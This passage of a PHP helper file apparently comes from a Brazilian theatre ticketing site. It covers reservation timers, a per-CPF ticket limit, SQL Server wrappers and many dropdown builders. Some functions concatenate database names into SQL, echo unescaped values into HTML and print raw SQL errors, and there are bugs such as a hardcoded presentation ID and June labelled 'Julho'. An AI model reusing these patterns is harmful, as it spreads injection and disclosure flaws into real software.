<?php
function getSiteLogo() { echo "<img src='../images/menu_logo.jpg' height='60px' id='logo' />"; }
function getSiteName() { echo "<h1 class='siteName'>$nomeSite</h1>"; }



/*  PEDIDOS  */



function tempoRestante($stamp = false) {
	$mainConnection = mainConnection();
	$query = 'SELECT TOP 1
				 CONVERT(VARCHAR(10), DT_VALIDADE, 103) DATA,  CONVERT(VARCHAR(8), DT_VALIDADE, 108) HORA
				 FROM MW_RESERVA
				 WHERE ID_SESSION = ?
				 ORDER BY DT_VALIDADE';
	$params = array(session_id());
	$rs = executeSQL($mainConnection, $query, $params, true);
	
	if ($stamp) {
		return $rs['DATA'] . ' - ' . $rs['HORA'];
	} else {
		$data = explode('/', $rs['DATA']);
		$hora = explode(':', $rs['HORA']);
		
		if (($data[1] - 1) < 0) {
			$retorno = '(new Date().getTime() + 3000)';
		} else {
			$retorno = $data[2] . ',' . ($data[1] - 1) . ',' . $data[0] . ',' . $hora[0] . ',' . $hora[1] . ',' . $hora[2];
		}
		
		return $retorno;
	}
}

function extenderTempo($min = NULL) {
	require_once('../settings/settings.php');
	
	if ($min != NULL) {
		$compraExpireTime = $min;
	}
	
	$mainConnection = mainConnection();
	$query = 'UPDATE MW_RESERVA SET
				 DT_VALIDADE = DATEADD(MI, ?, GETDATE())
				 WHERE ID_SESSION = ?';
	$params = array($compraExpireTime, session_id());
	
	$result = executeSQL($mainConnection, $query, $params) ? 'true' : 'false';
	
	return $result;
}

function verificarLimitePorCPF($conn, $codApresentacao, $user) {
	$mainConnection = mainConnection();
	
	if (isset($user)) {
		$rs = executeSQL($mainConnection, 'SELECT CD_CPF FROM MW_CLIENTE WHERE ID_CLIENTE = ?', array($user), true);
		$cpf = $rs[0];
		
		$query = 'SELECT (
						 SELECT ISNULL(QT_INGRESSOS_POR_CPF, 0)
						 FROM TABAPRESENTACAO A
						 INNER JOIN TABPECA P ON P.CODPECA = A.CODPECA
						 WHERE A.CODAPRESENTACAO = ?
					 ) AS QT_INGRESSOS_POR_CPF, (
						 SELECT SUM(CASE H.CODTIPLANCAMENTO WHEN 1 THEN 1 ELSE -1 END)
						 FROM TABCLIENTE C
						 INNER JOIN TABHISCLIENTE H ON H.CODIGO = C.CODIGO AND H.CODAPRESENTACAO = 1878
						 WHERE C.CPF = ?
					 ) AS QTDVENDIDO';
		$result = executeSQL($conn, $query, array($codApresentacao, $cpf));
		
		if (hasRows($result)) {
			$rs = fetchResult($result);
			if ($rs['QT_INGRESSOS_POR_CPF'] != 0 and $rs['QT_INGRESSOS_POR_CPF'] <= $rs['QTDVENDIDO']) {
				return 'Caro Sr(a)., este evento permite apenas '.$rs['QT_INGRESSOS_POR_CPF'].'
						ingresso(s) por CPF. Seu saldo para compras é de '.($rs['QT_INGRESSOS_POR_CPF'] - $rs['QTDVENDIDO']).'
						ingresso(s).';
			}
		}
	}
	return NULL;
}




/*  BANCO  */



require_once('../settings/mainConnections.php');

function sqlErrors($index = NULL) {
	$retorno = sqlsrv_errors();
	
	return (($index == NULL) ? $retorno : $retorno[0][$index]);
}

function beginTransaction($conn) {
	return sqlsrv_begin_transaction($conn);
}

function commitTransaction($conn) {
	return sqlsrv_commit($conn);
}

function rollbackTransaction($conn) {
	return sqlsrv_rollback($conn);
}

function executeSQL($conn, $strSql, $params = array(), $returnRs = false) {
	if (empty($params)) {
		$result = sqlsrv_query($conn, $strSql);
	} else {
		$result = sqlsrv_query($conn, $strSql, $params);
	}
	
	if ($returnRs) {
		return fetchResult($result);
	} else {
		return $result;
	}
}

function fetchResult($result) {
	return sqlsrv_fetch_array($result);
}

function numRows($conn, $strSql, $params = array()){
	if(empty($params)){
		$result = sqlsrv_query($conn, $strSql, $params, array( "Scrollable" => SQLSRV_CURSOR_KEYSET ));
	}else{
		$result = sqlsrv_query($conn, $strSql, $params, array( "Scrollable" => SQLSRV_CURSOR_KEYSET ));
	}
	return sqlsrv_num_rows($result);
}

function hasRows($result, $returnNum = false) {
	if ($returnNum) {
		return sqlsrv_num_rows($result);
	} else {
		return sqlsrv_has_rows($result);
	}
}


/*  COMBOS  */


function comboRegiaoGeografica($name) {
	$mainConnection = mainConnection();
	$result = executeSQL($mainConnection, 'SELECT ID_REGIAO_GEOGRAFICA, DS_REGIAO_GEOGRAFICA FROM MW_REGIAO_GEOGRAFICA');
	
	$combo = '<select name="'.$name.'" class="inputStyle" id="'.$name.'"><option value="">Selecione uma regi&atilde;o...</option>';
	while ($rs = fetchResult($result)) {
		$combo .= '<option value="'.$rs['ID_REGIAO_GEOGRAFICA'].'">'.utf8_encode($rs['DS_REGIAO_GEOGRAFICA']).'</option>';
	}
	$combo .= '</select>';
	
	return $combo;
}

function comboEvento($name, $teatro, $selected) {
	$mainConnection = mainConnection();
	$result = executeSQL($mainConnection, 'SELECT ID_EVENTO, DS_EVENTO FROM MW_EVENTO WHERE ID_BASE = ? AND IN_ATIVO = \'1\'', array($teatro));
	
	$combo = '<select name="'.$name.'" class="inputStyle" id="'.$name.'"><option value="">Selecione um evento...</option>';
	while ($rs = fetchResult($result)) {
		$combo .= '<option value="'.$rs['ID_EVENTO'].'"' .
						(($selected == $rs['ID_EVENTO']) ? ' selected' : '') .
						'>'.str_replace("'", "\'", utf8_encode($rs['DS_EVENTO'])).'</option>';
	}
	$combo .= '</select>';
	
	return $combo;
}

function comboEventoPermissao($name, $params, $selected) {
	$mainConnection = mainConnection();
        $result = executeSQL($mainConnection, 'SELECT E.ID_EVENTO, E.DS_EVENTO
                                            FROM MW_EVENTO E
                                            INNER JOIN MW_ACESSO_CONCEDIDO AC ON AC.ID_USUARIO = ? AND AC.ID_BASE = E.ID_BASE AND AC.CODPECA = E.CODPECA
                                            WHERE E.ID_BASE = ? AND E.IN_ATIVO = \'1\'', $params);
        $combo = '<select name="'.$name.'" class="inputStyle" id="'.$name.'"><option value="">Selecione um evento...</option>';

        while ($rs = fetchResult($result)) {
		$combo .= '<option value="'.$rs['ID_EVENTO'].'"' .
						(($selected == $rs['ID_EVENTO']) ? ' selected' : '') .
						'>'.utf8_encode($rs['DS_EVENTO']).'</option>';
	}
	$combo .= '</select>';

	return $combo;
}

function comboEstado($name, $selected, $extenso = false, $isCombo = true) {
	$mainConnection = mainConnection();
	$query = 'SELECT ID_ESTADO, ' . (($extenso) ? 'DS_ESTADO' : 'SG_ESTADO') . ' FROM MW_ESTADO';
	$result = executeSQL($mainConnection, $query);
	
	$combo = '<select name="'.$name.'" class="inputStyle" id="'.$name.'"><option value="">Selecione um estado...</option>';
	while ($rs = fetchResult($result)) {
		if (($selected == $rs['ID_ESTADO'])) {
			$isSelected = 'selected';
			$text = '<span name="'.$name.'" class="inputStyle">'.utf8_encode($rs[(($extenso) ? 'DS_ESTADO' : 'SG_ESTADO')]).'</span>';
		} else {
			$isSelected = '';
		}
		$combo .= '<option value="'.$rs['ID_ESTADO'].'"'.$isSelected.'>'.utf8_encode($rs[(($extenso) ? 'DS_ESTADO' : 'SG_ESTADO')]).'</option>';
	}
	$combo .= '</select>';
	
	return $isCombo ? $combo : $text;
}

function comboEstadoOptions($name, $selected, $extenso = false, $isCombo = true) {
	$mainConnection = mainConnection();
	$query = 'SELECT ID_ESTADO, ' . (($extenso) ? 'DS_ESTADO' : 'SG_ESTADO') . ' FROM MW_ESTADO ORDER BY DS_ESTADO';
	$result = executeSQL($mainConnection, $query);

	$combo = '<option value="">Selecione um estado...</option>';
	while ($rs = fetchResult($result)) {
		if (($selected == $rs['ID_ESTADO'])) {
			$isSelected = 'selected';
			$text = '<span name="'.$name.'" class="inputStyle">'.utf8_encode($rs[(($extenso) ? 'DS_ESTADO' : 'SG_ESTADO')]).'</span>';
		} else {
			$isSelected = '';
		}
		$combo .= '<option value="'.$rs['ID_ESTADO'].'"'.$isSelected.'>'.utf8_encode($rs[(($extenso) ? 'DS_ESTADO' : 'SG_ESTADO')]).'</option>';
	}
        if(sqlErrors())
            return print_r(sqlErrors());
        else
            return $isCombo ? $combo : $text;
}

function comboMunicipio($name, $selected, $idEstado, $isCombo = true) {
	$mainConnection = mainConnection();
	$query = 'SELECT ID_MUNICIPIO,DS_MUNICIPIO FROM MW_MUNICIPIO WHERE ID_ESTADO = ? ORDER BY DS_MUNICIPIO';
        $params = array($idEstado);
	$result = executeSQL($mainConnection, $query, $params);

	$combo = '<option value="">Selecione um município...</option>';
	while ($rs = fetchResult($result)) {
		if (($selected == $rs['ID_MUNICIPIO'])) {
			$isSelected = 'selected';
			$text = '<span name="'.$name.'" class="inputStyle">'.utf8_encode($rs["DS_MUNICIPIO"]).'</span>';
		} else {
			$isSelected = '';
		}
		$combo .= '<option value="'.$rs['ID_MUNICIPIO'].'"'.$isSelected.'>'.utf8_encode($rs["DS_MUNICIPIO"]).'</option>';
	}
        if(sqlErrors())
            return print_r(sqlErrors()) . print_r($params);
        else
            return $isCombo ? $combo : $text;
}

function comboTipoLocal($name, $selected, $isCombo = true) {
	$mainConnection = mainConnection();
	$query = 'SELECT ID_TIPO_LOCAL, DS_TIPO_LOCAL FROM MW_TIPO_LOCAL';
	$result = executeSQL($mainConnection, $query);

	$combo = '<select name="'.$name.'" class="inputStyle" id="'.$name.'"><option value="">Selecione um tipo...</option>';
	while ($rs = fetchResult($result)) {
		if (($selected == $rs['ID_TIPO_LOCAL'])) {
			$isSelected = 'selected';
			$text = '<span name="'.$name.'" class="inputStyle">'.utf8_encode($rs["DS_TIPO_LOCAL"]).'</span>';
		} else {
			$isSelected = '';
		}
		$combo .= '<option value="'.$rs['ID_TIPO_LOCAL'].'"'.$isSelected.'>'.utf8_encode($rs["DS_TIPO_LOCAL"]).'</option>';
	}
	$combo .= '</select>';

	return $isCombo ? $combo : $text;
}

function comboTipoLocalOptions($name, $selected, $isCombo = true) {
	$mainConnection = mainConnection();
	$query = 'SELECT ID_TIPO_LOCAL, DS_TIPO_LOCAL FROM MW_TIPO_LOCAL';
	$result = executeSQL($mainConnection, $query);

	$combo = '<option value="">Selecione um tipo...</option>';
	while ($rs = fetchResult($result)) {
		if (($selected == $rs['ID_TIPO_LOCAL'])) {
			$isSelected = 'selected';
			$text = '<span name="'.$name.'" class="inputStyle">'.utf8_encode($rs["DS_TIPO_LOCAL"]).'</span>';
		} else {
			$isSelected = '';
		}
		$combo .= '<option value="'.$rs['ID_TIPO_LOCAL'].'"'.$isSelected.'>'.utf8_encode($rs["DS_TIPO_LOCAL"]).'</option>';
	}

	return $isCombo ? $combo : $text;
}

function comboPrecosIngresso($name, $apresentacaoID, $idCadeira, $selected = NULL, $isCombo = true) {
	$mainConnection = mainConnection();
	
	$query = 'SELECT B.DS_NOME_BASE_SQL
				 FROM
				 MW_BASE B
				 INNER JOIN MW_EVENTO E ON E.ID_BASE = B.ID_BASE
				 INNER JOIN MW_APRESENTACAO A ON A.ID_EVENTO = E.ID_EVENTO
				 WHERE A.ID_APRESENTACAO = ?';
	$params = array($apresentacaoID);
	$rs = executeSQL($mainConnection, $query, $params, true);
	
	$query = 'SELECT ID_APRESENTACAO_BILHETE, AB.CODTIPBILHETE, DS_TIPO_BILHETE, VL_LIQUIDO_INGRESSO, P.IN_BIN_ITAU, ISNULL(P.QT_BIN_POR_CPF,0) AS QT_BIN_POR_CPF, P.CODTIPBILHETEBIN
					FROM
					 MW_APRESENTACAO_BILHETE AB 
					 INNER JOIN 
					 MW_APRESENTACAO   A
					 ON A.ID_APRESENTACAO = AB.ID_APRESENTACAO
					 INNER JOIN 
					 MW_EVENTO   E
					 ON E.ID_EVENTO = A.ID_EVENTO
					 INNER JOIN
					 '.$rs['DS_NOME_BASE_SQL'].'..TABTIPBILHETE B
					 ON	 B.CODTIPBILHETE = AB.CODTIPBILHETE
					 AND B.IN_VENDA_SITE = 1
					 AND 0 = CASE DATEPART(W, A.DT_APRESENTACAO)
								WHEN 1 THEN IN_DOM 
								WHEN 2 THEN IN_SEG 
								WHEN 3 THEN IN_TER 
								WHEN 4 THEN IN_QUA 
								WHEN 5 THEN IN_QUI 
								WHEN 6 THEN IN_SEX 
								ELSE IN_SAB
								END
					INNER JOIN
					'.$rs['DS_NOME_BASE_SQL'].'..TABPECA   P
					ON P.CODPECA = E.CODPECA
					WHERE AB.ID_APRESENTACAO = ? 
					AND AB.IN_ATIVO = \'1\'
					AND NOT EXISTS (SELECT 1 FROM 
							'.$rs['DS_NOME_BASE_SQL'].'..TABAPRESENTACAO AP
							INNER JOIN
							'.$rs['DS_NOME_BASE_SQL'].'..TABRESTRICAOBILHETE R
							ON AP.CODPECA = R.CODPECA
							AND AP.CODSALA = R.CODSALA
							AND R.CODSETOR IS NULL
						 WHERE AB.CODTIPBILHETE = R.CODTIPBILHETE
						   AND AP.CODAPRESENTACAO = A.CODAPRESENTACAO)
					AND NOT EXISTS (SELECT 1 FROM 
							'.$rs['DS_NOME_BASE_SQL'].'..TABAPRESENTACAO AP
							INNER JOIN
							'.$rs['DS_NOME_BASE_SQL'].'..TABRESTRICAOBILHETE R
							ON AP.CODPECA = R.CODPECA
							AND AP.CODSALA = R.CODSALA
							INNER JOIN
							'.$rs['DS_NOME_BASE_SQL'].'..TABSALDETALHE D
							ON D.CODSALA = AP.CODSALA
							AND D.INDICE  = ?
							AND D.CODSETOR = R.CODSETOR
						 WHERE AB.CODTIPBILHETE = R.CODTIPBILHETE
						   AND AP.CODAPRESENTACAO = A.CODAPRESENTACAO)
						ORDER BY DS_TIPO_BILHETE';
	$result = executeSQL($mainConnection, $query, array($apresentacaoID, $idCadeira));
	
	$combo = '<select name="'.$name.'" class="'.$name.' inputStyle">';//<option value="">Selecione um bilhete...</option>';
	while ($rs = fetchResult($result)) {
		$BIN = ($rs['IN_BIN_ITAU'] and $rs['CODTIPBILHETEBIN'] == $rs['CODTIPBILHETE']) ? 'qtBin="'.$rs['QT_BIN_POR_CPF'].'" codeBin="'.$rs['CODTIPBILHETEBIN'].'"' : '';
		
		if (($selected == $rs['ID_APRESENTACAO_BILHETE'])) {
			$isSelected = 'selected';
			$text = '<input type="hidden" name="'.$name.'" value="'.$rs['ID_APRESENTACAO_BILHETE'].'" '.$BIN.'><span class="'.$name.' inputStyle">'.utf8_encode($rs['DS_TIPO_BILHETE']).' - R$ '.$rs['VL_LIQUIDO_INGRESSO'].'</span>';
		} else {
			$isSelected = '';
		}
		
		$combo .= '<option value="'.$rs['ID_APRESENTACAO_BILHETE'].'" '.$isSelected.' '.$BIN.'>';
		$combo .= utf8_encode($rs['DS_TIPO_BILHETE']).' - R$ '.$rs['VL_LIQUIDO_INGRESSO'].'</option>';
	}
	$combo .= '</select>';
	
	return $isCombo ? $combo : $text;
}

function comboTeatro($name, $selected, $funcJavascript = "") {
	$mainConnection = mainConnection();
	$result = executeSQL($mainConnection, 'SELECT ID_BASE, DS_NOME_TEATRO FROM MW_BASE WHERE IN_ATIVO = \'1\' ORDER BY DS_NOME_TEATRO');
	
	$combo = '<select name="'.$name.'" '. $funcJavascript .' class="inputStyle" id="'.$name.'"><option value="">Selecione um local...</option>';
	while ($rs = fetchResult($result)) {
		$combo .= '<option value="'.$rs['ID_BASE'].'"'.(($selected == $rs['ID_BASE']) ? ' selected' : '').'>'.utf8_encode($rs['DS_NOME_TEATRO']).'</option>';
	}
	$combo .= '</select>';
	
	return $combo;
}

function comboSala($name, $teatroID) {
	$conn = getConnection($teatroID);
	$result = executeSQL($conn, 'SELECT CODSALA, NOMSALA FROM TABSALA WHERE STASALA = \'A\' AND INGRESSONUMERADO = \'1\'');
	
	$combo = '<select name="'.$name.'" class="inputStyle" id="'.$name.'"><option value="">Selecione uma sala...</option>';
	while ($rs = fetchResult($result)) {
		$combo .= '<option value="'.$rs['CODSALA'].'">'.utf8_encode($rs['NOMSALA']).'</option>';
	}
	$combo .= '</select>';
	
	return $combo;
}

function comboMeioPagamento($name, $selected = '-1', $isCombo = true) {
	$mainConnection = mainConnection();
	$query = 'SELECT ID_MEIO_PAGAMENTO, DS_MEIO_PAGAMENTO FROM MW_MEIO_PAGAMENTO';
	$result = executeSQL($mainConnection, $query);
	
	$combo = '<select name="'.$name.'" class="inputStyle" id="'.$name.'"><option value="">Selecione um meio...</option>';
	while ($rs = fetchResult($result)) {
		if ($selected == $rs['ID_MEIO_PAGAMENTO']) {
			$isSelected = 'selected';
			$text = utf8_encode($rs['DS_MEIO_PAGAMENTO']);
		} else {
			$isSelected = '';
		}
		$combo .= '<option value="'.$rs['ID_MEIO_PAGAMENTO'].'"'.$isSelected.'>'.utf8_encode($rs['DS_MEIO_PAGAMENTO']).'</option>';
	}
	$combo .= '</select>';
	
	return $isCombo ? $combo : $text;
}

function comboFormaPagamento($name, $teatroID, $selected = '-1', $isCombo = true) {
	$conn = getConnection($teatroID);
	$query = 'SELECT CODFORPAGTO, FORPAGTO FROM TABFORPAGAMENTO WHERE STAFORPAGTO = \'A\'';
	$result = executeSQL($conn, $query);
	
	$combo = '<select name="'.$name.'" class="inputStyle" id="'.$name.'"><option value="">Selecione uma forma...</option>';
	while ($rs = fetchResult($result)) {
		if ($selected == $rs['CODFORPAGTO']) {
			$isSelected = 'selected';
			$text = utf8_encode($rs['FORPAGTO']);
		} else {
			$isSelected = '';
		}
		$combo .= '<option value="'.$rs['CODFORPAGTO'].'"'.$isSelected.'>'.utf8_encode($rs['FORPAGTO']).'</option>';
	}
	$combo .= '</select>';
	
	return $isCombo ? $combo : $text;
}

function comboBilhetes2($name, $teatroID, $selected = '-1', $isCombo = true) {
	$conn = getConnection($teatroID);
	$query = 'SELECT CODTIPBILHETE, DS_NOME_SITE FROM TABTIPBILHETE WHERE STATIPBILHETE = \'A\' AND IN_VENDA_SITE = 1 ORDER BY 2';
	$result = executeSQL($conn, $query);
	
	$combo = '<select name="'.$name.'" class="inputStyle" id="'.$name.'"><option value="">Selecione um bilhete...</option>';
	while ($rs = fetchResult($result)) {
		if ($selected == $rs['CODTIPBILHETE']) {
			$isSelected = 'selected';
			$text = utf8_encode($rs['DS_NOME_SITE']);
		} else {
			$isSelected = '';
		}
		$combo .= '<option value="'.$rs['CODTIPBILHETE'].'"'.$isSelected.'>'.utf8_encode($rs['DS_NOME_SITE']).'</option>';
	}
	$combo .= '</select>';
	
	return $isCombo ? $combo : $text;
}

// Cria combo de situações
function comboSituacao($situacao = null,$is_combo = true){
	$dados = array("V" => "Escolha a opção...",
				   "F" => "Finalizado",
				   "P" => "Em Processamento",
				   "C" => "Cancelado pelo Usuário",
				   "E" => "Expirado");	  
        if($is_combo)
        {
            $return =  "<select name=\"situacao\" id=\"cboSituacao\">";
            foreach($dados as $key => $valor){
                    if($situacao == $key)
                            $selected = "selected=\"selecteded\"";
                    else
                            $selected = "";

                    $return .= "<option value=\"". $key ."\"". $selected .">". $valor ."</option>";
            }
            $return .= "</select>";
        }
        else
        {
           foreach($dados as $key => $valor){
               if($key==$situacao)
               {
                   $return=$valor;
               }
           }
        }
         return $return;
}

function comboFormaEntrega($forma = null)
{
    $dados= array("R" => "Retirar no Local");

    foreach($dados as $key => $valor){
        if($key==$forma)
        {
            $return=$valor;
        }
    }

    return $return;
}

function comboLocal(){
	$mainConnection = mainConnection();
	$tsql = "SELECT ID_BASE, DS_NOME_TEATRO, DS_NOME_BASE_SQL FROM CI_MIDDLEWAY..MW_BASE WHERE IN_ATIVO = 1 ORDER BY 2";
	$stmt = executeSQL($mainConnection, $tsql, array());
	
	print("<select name=\"local\" id=\"local\" >");
	while($locais = fetchResult($stmt)){
		print("<option value=\"". $locais["ID_BASE"] ."\" >". $locais["DS_NOME_TEATRO"] ."</option>");
	}
	print("</select>");
}

function comboEventos($idBase, $nomeBase, $idUsuario){
	$mainConnection  = mainConnection();
	$tsql = "SELECT P.CODPECA, P.NOMPECA 
			  FROM 
				  ".$nomeBase."..TABPECA P
				  INNER JOIN 
				  CI_MIDDLEWAY..MW_ACESSO_CONCEDIDO A
				  ON	A.CODPECA = P.CODPECA
				  AND A.ID_BASE = ?
				  AND A.ID_USUARIO = ?
			  WHERE STAPECA = 'A' ORDER BY 2";
	$stmt = executeSQL($mainConnection, $tsql, array($idBase, $idUsuario));
	print("<option value=\"null\">Todos</option>");
	while($eventos = fetchResult($stmt)){
		print("<option value=\"". $eventos["CODPECA"] ."\">". utf8_encode($eventos["NOMPECA"]) ."</option>\n");	
	}	
}

function comboPatrocinador($name, $selected = '-1', $isCombo = true) {
	$mainConnection = mainConnection();
	$query = 'SELECT ID_PATROCINADOR, DS_NOMPATROCINADOR FROM MW_PATROCINADOR';
	$result = executeSQL($mainConnection, $query);
	
	$combo = '<select name="'.$name.'" class="inputStyle" id="'.$name.'"><option value="">Selecione um patrocinador...</option>';
	while ($rs = fetchResult($result)) {
		if ($selected == $rs['ID_PATROCINADOR']) {
			$isSelected = 'selected';
			$text = utf8_encode($rs['DS_NOMPATROCINADOR']);
		} else {
			$isSelected = '';
		}
		$combo .= '<option value="'.$rs['ID_PATROCINADOR'].'"'.$isSelected.'>'.utf8_encode($rs['DS_NOMPATROCINADOR']).'</option>';
	}
	$combo .= '</select>';
	
	return $isCombo ? $combo : $text;
}

function comboCartaoPatrocinado($name, $idPatrocinador, $selected = '-1', $isCombo = true) {
	$mainConnection = mainConnection();
	$query = 'SELECT ID_CARTAO_PATROCINADO, DS_CARTAO_PATROCINADO FROM MW_CARTAO_PATROCINADO WHERE ID_PATROCINADOR = ?';
	$result = executeSQL($mainConnection, $query, array($idPatrocinador));
	
	$combo = '<select name="'.$name.'" class="inputStyle" id="'.$name.'"><option value="">Selecione um cart&atilde;o patrocinado...</option><option value="TODOS">&lt; TODOS &gt;</option>';
	while ($rs = fetchResult($result)) {
		if ($selected == $rs['ID_CARTAO_PATROCINADO']) {
			$isSelected = 'selected';
			$text = utf8_encode($rs['DS_CARTAO_PATROCINADO']);
		} else {
			$isSelected = '';
		}
		$combo .= '<option value="'.$rs['ID_CARTAO_PATROCINADO'].'"'.$isSelected.'>'.utf8_encode($rs['DS_CARTAO_PATROCINADO']).'</option>';
	}
	$combo .= '</select>';
	
	return $isCombo ? $combo : $text;
}

function comboTabPeca($name, $conn, $selected = '-1', $isCombo = true) {
	$query = 'SELECT CODPECA, NOMPECA FROM TABPECA';
	$result = executeSQL($conn, $query);
	
	$combo = '<select name="'.$name.'" class="inputStyle" id="'.$name.'"><option value="">Selecione uma pe&ccedil;a...</option>';
	while ($rs = fetchResult($result)) {
		if ($selected == $rs['CODPECA']) {
			$isSelected = 'selected';
			$text = utf8_encode($rs['NOMPECA']);
		} else {
			$isSelected = '';
		}
		$combo .= '<option value="'.$rs['CODPECA'].'"'.$isSelected.'>'.utf8_encode($rs['NOMPECA']).'</option>';
	}
	$combo .= '</select>';
	
	return $isCombo ? $combo : $text;
}

function comboEventosItau($name, $user, $selected = '-1') {
	$mainConnection = mainConnection();
	$query = 'SELECT E.ID_EVENTO, E.DS_EVENTO
				FROM MW_EVENTO E
				INNER JOIN MW_USUARIO_ITAU_EVENTO U ON E.ID_EVENTO = U.ID_EVENTO
				WHERE U.ID_USUARIO = ? AND E.IN_VENDE_ITAU = 1
				ORDER BY DS_EVENTO';
	$result = executeSQL($mainConnection, $query, array($user));
	
	$combo = '<select name="'.$name.'" class="inputStyle" id="'.$name.'"><option value="">Selecione um evento...</option>';
	while ($rs = fetchResult($result)) {
		if ($selected == $rs['ID_EVENTO']) {
			$isSelected = ' selected';
		} else {
			$isSelected = '';
		}
		$combo .= '<option value="'.$rs['ID_EVENTO'].'"'.$isSelected.'>'.utf8_encode($rs['DS_EVENTO']).'</option>';
	}
	$combo .= '</select>';
	
	return $combo;
}

function comboApresentacoesItau($name, $user, $evento, $selected = '-1') {
	$mainConnection = mainConnection();
	$query = "SELECT A.ID_APRESENTACAO, CONVERT(VARCHAR(10),
				DT_APRESENTACAO, 103) + ' - ' + A.HR_APRESENTACAO + ' || ' + DS_PISO DS_APRESENTACAO,
				A.DT_APRESENTACAO, A.HR_APRESENTACAO
				FROM MW_EVENTO E
				INNER JOIN MW_USUARIO_ITAU_EVENTO U ON E.ID_EVENTO = U.ID_EVENTO
				INNER JOIN MW_APRESENTACAO A ON A.ID_EVENTO = E.ID_EVENTO
				WHERE E.ID_EVENTO = ? AND E.IN_VENDE_ITAU = 1 AND U.ID_USUARIO = ? AND A.IN_ATIVO = 1
				AND CONVERT(VARCHAR(8), A.DT_APRESENTACAO,112) >= CONVERT(VARCHAR(8), GETDATE()-2, 112)
				ORDER BY DT_APRESENTACAO, HR_APRESENTACAO";
	$result = executeSQL($mainConnection, $query, array($evento, $user));
	
	$combo = '<select name="'.$name.'" class="inputStyle" id="'.$name.'"><option value="">Selecione uma apresenta&ccedil;&atilde;o...</option>';
	while ($rs = fetchResult($result)) {
		if ($selected == $rs['ID_APRESENTACAO']) {
			$isSelected = ' selected';
		} else {
			$isSelected = '';
		}
		$combo .= '<option value="'.$rs['ID_APRESENTACAO'].'"'.$isSelected.'>'.utf8_encode($rs['DS_APRESENTACAO']).'</option>';
	}
	$combo .= '</select>';
	
	return $combo;
}

function comboEventoPorUsuario($name, $teatro, $usuario, $selected) {
	$mainConnection = mainConnection();
	$result = executeSQL($mainConnection, "SELECT AC.CODPECA, E.DS_EVENTO
											FROM MW_EVENTO E
											INNER JOIN MW_ACESSO_CONCEDIDO AC ON E.ID_BASE = AC.ID_BASE
											AND AC.ID_USUARIO = ? AND AC.CODPECA = E.CODPECA
											WHERE E.ID_BASE = ?
											AND E.IN_ATIVO = '1'
											ORDER BY DS_EVENTO",
						array($usuario, $teatro));
	
	$combo = '<select name="'.$name.'" class="inputStyle" id="'.$name.'"><option value="">Selecione um evento...</option>';
	while ($rs = fetchResult($result)) {
		$combo .= '<option value="'.$rs['CODPECA'].'"' .
						(($selected == $rs['CODPECA']) ? ' selected' : '') .
						'>'.str_replace("'", "\'", utf8_encode($rs['DS_EVENTO'])).'</option>';
	}
	$combo .= '</select>';
	
	return $combo;
}

function comboTeatroPorUsuario($name, $usuario, $selected) {
	$mainConnection = mainConnection();
	$result = executeSQL($mainConnection, "SELECT DISTINCT B.ID_BASE, B.DS_NOME_TEATRO
											FROM MW_BASE B
											INNER JOIN MW_ACESSO_CONCEDIDO AC ON B.ID_BASE = AC.ID_BASE
											AND AC.ID_USUARIO = ?
											WHERE IN_ATIVO = '1'
											ORDER BY DS_NOME_TEATRO",
						array($usuario));
	
	$combo = '<select name="'.$name.'" class="inputStyle" id="'.$name.'"><option value="">Selecione um local...</option>';
	while ($rs = fetchResult($result)) {
		$combo .= '<option value="'.$rs['ID_BASE'].'"'.(($selected == $rs['ID_BASE']) ? ' selected' : '').'>'.utf8_encode($rs['DS_NOME_TEATRO']).'</option>';
	}
	$combo .= '</select>';
	
	return $combo;
}

function comboMeses($name, $selected, $number = false) {
	$meses = array(
		'01' => 'Janeiro',
		'02' => 'Fevereiro',
		'03' => 'Março',
		'04' => 'Abril',
		'05' => 'Maio',
		'06' => 'Julho',
		'07' => 'Julho',
		'08' => 'Agosto',
		'09' => 'Setembro',
		'10' => 'Outubro',
		'11' => 'Novembro',
		'12' => 'Dezembro'
	);
	
	$combo = '<select name="'.$name.'" class="inputStyle" id="'.$name.'"><option value="">Selecione um m&ecirc;s...</option>';
	foreach ($meses as $key => $val) {
		$combo .= '<option value="'.$key.'"'.(($selected == $key) ? ' selected' : '').'>'.(($number) ? $key : $val).'</option>';
	}
	$combo .= '</select>';
	
	return $combo;
}

function comboAnos($name, $selected, $inicial = 0, $final = 0) {
	$combo = '<select name="'.$name.'" class="inputStyle" id="'.$name.'"><option value="">Selecione um ano...</option>';
	for ($i = $inicial; $i <= $final; $i++) {
		$combo .= '<option value="'.$i.'"'.(($selected == $i) ? ' selected' : '').'>'.$i.'</option>';
	}
	$combo .= '</select>';
	
	return $combo;
}

function comboPaginas($name, $selected) {
	$conn = getConnectionDw();
	$result = executeSQL($conn, "SELECT ID_PAGINA, DS_PAGINA FROM DIM_PAGINA ORDER BY 2", array());

	$combo = '<select name="'.$name.'" class="inputStyle" id="'.$name.'"><option value="">Selecione uma p&aacute;gina...</option>';
	while ($rs = fetchResult($result)) {
		$combo .= '<option value="'.$rs['ID_PAGINA'].'"'.(($selected == $rs['ID_PAGINA']) ? ' selected' : '').'>'.utf8_encode($rs['DS_PAGINA']).'</option>';
	}
	$combo .= '</select>';

	return $combo;
}

function comboOrigemChamado($name, $selected) {
	$conn = getConnectionDw();
	$result = executeSQL($conn, "SELECT ID_ORIGEM_CHAMADO, DS_ORIGEM_CHAMADO FROM DIM_ORIGEM_CHAMADO ORDER BY 2", array());

	$combo = '<select name="'.$name.'" class="inputStyle" id="'.$name.'"><option value="">Selecione uma origem...</option>';
	while ($rs = fetchResult($result)) {
		$combo .= '<option value="'.$rs['ID_ORIGEM_CHAMADO'].'"'.(($selected == $rs['ID_ORIGEM_CHAMADO']) ? ' selected' : '').'>'.utf8_encode($rs['DS_ORIGEM_CHAMADO']).'</option>';
	}
	$combo .= '</select>';

	return $combo;
}

function comboTipoChamado($name, $selected) {
	$conn = getConnectionDw();
	$result = executeSQL($conn, "SELECT ID_TIPO_CHAMADO, DS_TIPO_CHAMADO FROM DIM_TIPO_CHAMADO ORDER BY 2", array());

	$combo = '<select name="'.$name.'" class="inputStyle" id="'.$name.'"><option value="">Selecione um tipo...</option>';
	while ($rs = fetchResult($result)) {
		$combo .= '<option value="'.$rs['ID_TIPO_CHAMADO'].'"'.(($selected == $rs['ID_TIPO_CHAMADO']) ? ' selected' : '').'>'.utf8_encode($rs['DS_TIPO_CHAMADO']).'</option>';
	}
	$combo .= '</select>';

	return $combo;
}

function comboTipoResolucao($name, $selected) {
	$conn = getConnectionDw();
